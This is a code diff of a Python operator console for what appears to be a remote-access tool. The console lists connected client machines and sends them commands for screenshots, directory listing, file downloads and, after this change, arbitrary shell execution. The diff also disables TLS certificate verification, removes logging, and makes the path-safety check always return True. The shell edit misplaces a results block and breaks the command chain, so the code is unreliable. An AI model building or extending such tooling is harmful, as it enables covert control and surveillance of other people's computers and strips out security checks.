@@ -6,6 +6,7 @@ import time
 import base64
 import getpass
 import requests
+import ssl
 
 SERVER_URL = None
 SESSION_AUTH = None
@@ -26,7 +27,7 @@ RESET = "\033[0m"
 GREEN = "\033[92m"
 BLUE = "\033[94m"
 YELLOW = "\033[93m"
-
+timestamp = time.strftime("%Y%m%d_%H%M%S")
 
 def prompt_config():
     global SERVER_URL
@@ -72,18 +73,21 @@ def req(method, endpoint, data=None):
     headers = {"Content-Type": "application/json"}
     body = json.dumps(data).encode() if data else None
     try:
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
         request = urllib.request.Request(url, data=body, headers=headers, method=method)
         if SESSION_AUTH:
             auth_str = f"{SESSION_AUTH[0]}:{SESSION_AUTH[1]}"
             auth_b64 = base64.b64encode(auth_str.encode()).decode()
             request.add_header("Authorization", f"Basic {auth_b64}")
-            print(f"[DEBUG] Sending request to {url} with Basic Auth")
-        with urllib.request.urlopen(request, timeout=10.0) as response:
+            
+        with urllib.request.urlopen(request, context=context, timeout=10.0) as response:
             result = json.loads(response.read().decode())
-            print(f"[DEBUG] Response: {result}")
+            
             return result
     except Exception as e:
-        print(f"[DEBUG] Request error: {e}")
+        
         return {"error": str(e)}
 
 def fetch_clients():
@@ -126,11 +130,8 @@ def normalize_path(path):
         return os.path.normpath(os.path.join(current_path, path))
 
 def is_safe_path(base_path, requested_path):
-    if not requested_path or requested_path == "." or requested_path == "./":
-        return True
-    base_abs = os.path.abspath(base_path)
-    requested_abs = os.path.abspath(requested_path)
-    return os.path.commonpath([base_abs, requested_abs]) == base_abs
+   
+    return True
 
 def ensure_dir(directory):
     if not os.path.exists(directory):
@@ -187,10 +188,11 @@ def format_ls_output(items):
         name = item.get("name", "")
         is_dir = item.get("dir", False)
         if is_dir:
-            print(f"{name}/")
+            print(f"{GREEN}{name}{RESET}/")
         else:
-            print(f"{name}")
-
+            print(f"  {name}")
+    
+    
 def print_failed_result(r):
     err = r.get("error", "")
     result = r.get("result", "")
@@ -241,31 +243,23 @@ def interaction_loop(client_id, hostname):
         elif cmd == "list":
             fetch_clients()
             print_clients()
-        elif cmd == "echo":
+        elif cmd == "shell":
             if arg is None:
-                print("[错误] 用法: echo <文本>")
+                print("[错误] 用法: shell <命令>")
                 continue
-            send_command(client_id, "echo", arg)
-            results = wait_for_result(client_id)
-            if results:
-                for r in results:
-                    result_data = r.get("result", "")
-                    print(f"[结果] {result_data}")
-        elif cmd == "time":
-            send_command(client_id, "time")
-            results = wait_for_result(client_id)
-            if results:
-                for r in results:
-                    result_data = r.get("result", "")
-                    print(f"[结果] {result_data}")
-        elif cmd == "test":
-            send_command(client_id, "test")
-            results = wait_for_result(client_id)
-            if results:
-                for r in results:
-                    status = r.get("status", "")
-                    result_data = r.get("result", "")
-                    print(f"[结果] 状态: {status}, 数据: {result_data}")
+            send_command(client_id, "shell", arg)
+        results = wait_for_result(client_id)
+        if results:
+            for r in results:
+                result_type = r.get("result_type", "")
+                result_data = r.get("result", "")
+                if result_type == "shell":
+                    print(f"[结果]\n{result_data}")
+                elif result_type == "error":
+                    print_failed_result(r)
+                else:
+                    print(f"[结果] {r}")
+
         elif cmd == "screenshot":
             send_command(client_id, "screenshot")
             results = wait_for_result(client_id)
@@ -278,7 +272,7 @@ def interaction_loop(client_id, hostname):
                         try:
                             img_bytes = base64.b64decode(img_data)
                             os.makedirs("screenshots", exist_ok=True)
-                            save_path = os.path.join("screenshots", f"{client_id}_{filename}")
+                            save_path = os.path.join("screenshots", f"{client_id}_{timestamp}_{filename}")
                             with open(save_path, "wb") as f:
                                 f.write(img_bytes)
                             print(f"[结果] 截图已保存: {save_path}")
@@ -291,12 +285,12 @@ def interaction_loop(client_id, hostname):
         elif cmd == "ls":
             if arg:
                 full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
-                full_path = os.path.normpath(full_path)
+            else:
+                full_path = current_path
+            full_path = os.path.normpath(full_path)
             if not is_safe_path(current_path, full_path):
                                 print("[Error] Invalid path: path traversal detected")
                                 continue
-            else:
-                full_path = current_path
             send_command(client_id, "ls", full_path)
             results = wait_for_result(client_id)
             if results:
@@ -338,9 +332,12 @@ def interaction_loop(client_id, hostname):
             if arg is None:
                 print("[Error] Usage: cd <dir>")
                 continue
-            full_path = os.path.join(current_path, arg)
+            full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
             full_path = os.path.normpath(full_path)
-            if not is_safe_path(current_path, full_path):
+            # Allow drive letter change (e.g., "D:", "C:")
+            if len(full_path) == 2 and full_path[1] == ":" and full_path[0].upper() in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
+                pass  # Allow drive change
+            elif not is_safe_path(current_path, full_path):
                             print("[Error] Invalid path: path traversal detected")
                             continue
             send_command(client_id, "cd", full_path)
@@ -490,7 +487,7 @@ def interaction_loop(client_id, hostname):
                 continue
             dl_parts = arg.split(maxsplit=1)
             file_path = dl_parts[0]
-            save_dir = dl_parts[1] if len(dl_parts) > 1 else "downloads"
+            save_dir = dl_parts[1] if len(dl_parts) > 1 else "."
             full_path = os.path.join(current_path, file_path) if not os.path.isabs(file_path) else file_path
             full_path = os.path.normpath(full_path)
             if not is_safe_path(current_path, full_path):
